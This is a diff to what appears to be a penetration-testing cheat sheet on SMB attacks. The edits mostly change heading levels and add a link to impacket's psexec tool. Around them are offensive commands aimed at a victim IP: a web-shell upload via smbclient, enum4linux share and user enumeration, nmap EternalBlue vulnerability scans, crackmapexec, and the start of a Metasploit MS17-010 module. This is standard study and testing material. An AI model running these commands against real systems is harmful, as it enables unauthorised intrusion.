@@ -597,7 +597,7 @@ smbpasswd -r <victim_ip -U <user_name>
 smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
 ```
  
-## enum4linux
+#### enum4linux
   - Share Enumeration:
     - enum4linux-S [victim_ip]
   - Usernames Enumeration:
@@ -607,7 +607,7 @@ smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
   - enum4linux -a  [victim_ip]
   - enum4linux -u 'guest' -p '' -a  [victim_ip]
   
-## eternalblue
+#### eternalblue
 
 ### mmap_script:
 ```
@@ -615,12 +615,16 @@ nmap -v --script vuln [victim_ip] -p 445,139
 nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
 ```
 
-## crackmapexec
+#### crackmapexec
 ```
 crackmapexec smb <victim_ip>
 ```
 
-### eternal_blue_metasploit
+#### psexec
+- Tool:
+  https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
+
+#### eternal_blue_metasploit
 ```
 example one:
 use auxiliary/admin/smb/ms17_010_command
